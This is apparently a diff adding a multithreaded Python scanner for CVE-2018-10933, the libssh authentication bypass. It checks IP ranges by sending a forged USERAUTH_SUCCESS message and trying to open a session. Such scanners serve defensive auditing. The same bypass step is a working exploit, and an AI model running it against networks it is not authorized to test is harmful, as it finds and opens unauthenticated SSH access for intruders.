@@ -1,0 +1,162 @@
+#!/usr/bin/env python3
+
+import sys
+import argparse
+import ipaddress
+import threading
+import time
+import paramiko
+import socket
+from queue import Queue, Empty
+
+timeToDie=False
+tasks = Queue()
+rets = Queue()
+
+FAILCONNECT=-1
+VULN=0
+NOTVULN=1
+NOIDEA=2
+
+def bpndscan_cve2018_10933(host, port):
+    paramiko.util.log_to_file('bpnd_cve2018_10933.err')
+    sock = socket.socket()
+    sock.settimeout(1)
+    try:
+        sock.connect((host, port))
+
+        # instantiate transport
+        m = paramiko.message.Message()
+        transport = paramiko.transport.Transport(sock)
+        transport.start_client()
+        m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
+        transport._send_message(m)
+        cmd_channel = transport.open_session(timeout=1)
+    except socket.error as e:
+        return (FAILCONNECT, host, port)
+    except paramiko.ssh_exception.SSHException as e:
+        return (NOTVULN, host, port)
+    except Exception as e:
+        return (NOIDEA, host, port)
+    finally:
+        sock.close()
+
+    return (VULN, host, port)
+
+class bpndLibssh(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+
+    def run(self):
+        while not timeToDie:
+            try:
+                task = tasks.get(block=True, timeout=1)
+                self.runScan(task)
+                tasks.task_done()
+            except Empty:
+                continue
+
+    def runScan(self, task):
+        r=bpndscan_cve2018_10933(task[0], task[1])
+        rets.put(r)
+
+class bpndReport(threading.Thread):
+    def __init__(self, verbosity=0):
+        threading.Thread.__init__(self)
+        self.verbosity=verbosity
+
+    def run(self):
+        while not timeToDie:
+            try:
+                ret = rets.get(block=True,  timeout=1)
+                self.processRet(ret)
+                rets.task_done()
+            except Empty:
+                continue
+
+    def processRet(self, ret):
+        if ret[0] == FAILCONNECT:
+            if self.verbosity >= 2:
+                print('Failed_to_connect {}:{}'.format(ret[1], ret[2]))
+            return
+
+        if ret[0] == NOTVULN:
+            if self.verbosity >= 1:
+                print('NOT_VULNERABLE {}:{}'.format(ret[1], ret[2]))
+            return
+
+        if ret[0] == VULN:
+            print('VULNERABLE {}:{}'.format(ret[1], ret[2]))
+            return
+
+        if ret[0] == NOIDEA:
+            if self.verbosity >= 1:
+                print('NOT_SSH {}:{}'.format(ret[1], ret[2]))
+            return
+        raise AssertionError('This should never happen.')
+
+
+def main():
+    global timeToDie
+
+    parser = argparse.ArgumentParser(description='bpnd-libssh - blueintel scanner for CVE-2018-10933')
+    parser.add_argument('TARGET', nargs='?', help='IP or network range to scan e.g 10.0.0.1 or 192.168.1.0/24', default=None)
+    parser.add_argument('-p', '--port', default='22,2222', help='Ports to check e.g 22,8022,2222')
+    parser.add_argument('-t', '--threads', default=16, type=int, help='Number of parallel threads to use')
+    parser.add_argument('-v', '--verbose', default=0, action='count', help='Enable verbose output (repeat -v for more verbosity)')
+    parser.add_argument('-f', '--file', help='Read IPs from STDIN', action='store_true')
+
+    args = parser.parse_args()
+
+    if args.threads < 1:
+        print('You will need at least one thread...')
+        sys.exit(-1)
+
+    try:
+        targetports = [int(a) for a in args.port.split(',') ]
+    except Exception as e:
+        print('Invalid port specification. Example: -p 22,2222')
+        sys.exit(-1)
+
+    if args.TARGET is not None:
+        try:
+            targets=ipaddress.ip_network(args.TARGET)
+        except Exception as e:
+            print('Not a valid target. Target can be an IP (e.g 192.168.1.1), or a network address (e.g 192.168.1.0/24)')
+            sys.exit(-1)
+    elif not args.file:
+        print('Invalid usage. Try -h.')
+        sys.exit(-1)
+    else:
+        targets=list()
+        for line in sys.stdin:
+            targets.append(line.strip())
+
+
+
+
+    threadList=list()
+    for i in range(0, args.threads):
+        t=bpndLibssh()
+        threadList.append(t)
+        t.start()
+
+    reportThread=bpndReport(verbosity=args.verbose)
+    reportThread.start()
+
+    for ip in targets:
+        [tasks.put( (str(ip), p) ) for p in targetports]
+
+    tasks.join()
+    rets.join()
+    timeToDie=True
+
+if __name__ == '__main__':
+    try:
+        main()
+    except KeyboardInterrupt as e:
+        timeToDie=True
+        print('Interrupt! - cleaning up.')
+
+
+# bye
